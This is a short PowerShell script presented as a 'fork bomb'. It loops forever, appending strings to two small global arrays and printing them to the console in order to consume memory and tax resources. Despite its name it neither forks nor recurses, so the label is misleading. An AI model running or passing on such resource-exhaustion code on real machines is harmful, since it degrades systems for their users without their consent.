
$Global:Bomb1 = New-Object 'object[,]' 2,2;
$Global:Bomb2 = New-Object 'object[,]' 2,2;

<# -------------------------------------------------------------------------------------- #>

function Consume_Memory($BOMB)
{
              [String] $Poppins = "SuperCalaFrajalIsticExpeAlaDocious";
              [String] $SliceOfPie = "3.141592653";
 
              Write-Host("`nTotal # elements in array = " + $BOMB.Count);
              Write-Host("Total X elements in array = " + ($BOMB.GetUpperBound(0)+1));
              Write-Host("Total Y elements in array = " + ($BOMB.GetUpperBound(1)+1));

              #Consume more memory
              for($x = 0; $x -LT ($BOMB.GetUpperBound(0)+1); $x++)
              {
                    $BOMB[$x,0] += $Poppins;
                    $BOMB[$x,1] += $SliceOfPie;
              }

              Write-Host("`n");

              #Create display output values to tax resources
              for($y = 0; $y -LT $BOMB.Count; $y++)
              {
                  Write-Host("`nSuperCala = " + $BOMB[0,0]);
                  Write-Host("`nPie = " + $BOMB[0,1]);
              }
}


<# -------------------------------------------------------------------------------------- #>

function Infinite_Recursive_Loop_Fork_Bomb
{
         Clear;

         for(;;)
         {
             Consume_Memory($Global:Bomb1);
             Write-Host("`nGlobal BOMB1 = " + $Global:Bomb1);
             Consume_Memory($Global:Bomb2);
             Write-Host("`n`nGlobal BOMB2 = " + $Global:Bomb2);
         }
}

<# -------------------------------------------------------------------------------------- #>

#------- Function Call Invocations -------
Infinite_Recursive_Loop_Fork_Bomb;
